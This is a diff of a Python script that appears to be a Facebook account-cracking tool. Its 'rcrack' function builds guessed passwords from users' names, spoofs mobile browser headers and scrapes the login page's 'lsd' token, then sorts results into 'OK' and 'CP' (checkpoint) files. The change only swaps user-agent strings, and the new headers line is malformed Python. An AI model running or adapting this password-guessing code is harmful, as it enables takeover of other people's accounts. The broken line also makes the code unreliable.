@@ -40,7 +40,7 @@ host_list = [
 fcp = "CP/CP-"+str(ltim()[2])+"-"+str(ltim()[1])+"-"+str(ltim()[0])+".txt"
 fok = "OK/OK-"+str(ltim()[2])+"-"+str(ltim()[1])+"-"+str(ltim()[0])+".txt"
 #_________[ LIST USERAGENT ]_____>>
-list_useragent = ["Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36"]
+list_useragent = ["User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:49.0) Gecko/20100101 Firefox/49.0"]
 #_________[ EMPTY INT/LISTS ]_____>>
 ids = []
 pwd = []
@@ -157,7 +157,7 @@ def rcrack(uid,pwx,name,tl,host):
 			ps = ps.replace("fullname",fullname)
 			session = requests.Session()
 			pro = random.choice(list_useragent)
-			headers_ = {"Host":host,"upgrade-insecure-requests":"1","user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":hostx,"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
+			headers_ = {"Host":host,"upgrade-insecure-requests":"1",'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:49.0) Gecko/20100101 Firefox/49.0',"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":hostx,"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
 			free_fb = session.get(f'https://{host}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F',headers=headers_).text
 			log_data = {
 				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
